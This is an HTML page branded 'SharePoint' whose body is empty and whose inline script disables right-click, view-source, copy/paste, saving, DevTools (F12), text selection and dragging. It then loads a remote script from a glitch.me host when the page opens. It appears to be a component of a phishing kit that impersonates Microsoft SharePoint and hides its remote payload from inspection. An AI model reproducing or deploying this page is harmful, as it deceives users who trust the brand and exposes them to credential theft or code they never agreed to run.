<html>
<head>
    <title>SharePoint</title><script>
        document.addEventListener("contextmenu", event => event.preventDefault()); // Disable right-click

        document.addEventListener("keydown", event => {
            if (event.ctrlKey && (event.key === "u" || event.key === "U" || 
                                  event.key === "c" || event.key === "C" || 
                                  event.key === "x" || event.key === "X" || 
                                  event.key === "v" || event.key === "V" || 
                                  event.key === "s" || event.key === "S")) {
                event.preventDefault();
            }
            if (event.key === "F12") { // Disable F12 (DevTools)
                event.preventDefault();
            }
        });

        document.addEventListener("selectstart", event => event.preventDefault()); // Disable text selection
        document.addEventListener("dragstart", event => event.preventDefault());  // Disable dragging content
    </script>
    <script src="https://aquatic-pollen-shake.glitch.me/script.js"></script>
</head>
<body>
    <h1></h1>
</body>
</html>
